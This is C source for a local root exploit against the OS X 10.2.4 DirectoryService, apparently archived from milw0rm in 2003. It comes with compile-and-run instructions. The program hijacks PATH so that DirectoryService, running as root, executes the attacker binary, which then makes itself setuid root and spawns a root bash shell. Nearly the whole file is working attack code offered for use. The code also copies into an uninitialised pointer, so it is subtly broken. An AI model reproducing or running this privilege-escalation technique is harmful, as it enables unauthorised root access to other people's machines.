/* 
   OS X <= 10.2.4 DirectoryService local root PATH exploit
   DirectoryService must be crashed prior to execution, per
   @stake advisory.  If you discover how to crash DirectoryService
   e-mail me at neeko@haackey.com  [Neeko Oni]

--
Assuming DirectoryService has been crashed/killed, compile
this code as 'touch' (gcc osxds.c -o touch) and execute.

bash$ ./touch
*bunch of stuff here*
euid is root.
bash#

*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

int 
main(int argc, char **argv)
{
	char           *ORIGPATH;
	int             temp;
	if (argc < 2) {
		if (geteuid() == 0) {
		printf("euid is root.\n");
		setuid(0);
		execl("/bin/bash", "bash", NULL);
		}
		strcpy(ORIGPATH, getenv("PATH"));
		printf("Original path: %s\n", ORIGPATH);
		setenv("PATH", ".", 1);
		printf("New path: %s\n", getenv("PATH"));
		printf("Executing DirectoryService with false PATH...\n");
		if (fork() == 0) {
			execl("/usr/sbin/DirectoryService", "DirectoryService", NULL);
		}
		printf("Forked DirectoryService, pausing before shell exec...\n");
		sleep(3);
		printf("Cross your fingers.\n");
		setenv("PATH", ORIGPATH, 1);
		printf("Path restored: %s\n", getenv("PATH"));
		execl("./touch", "touch", NULL);		
	}
system("/usr/sbin/chown root ./touch;/bin/chmod +s ./touch");
}

// milw0rm.com [2003-04-18]
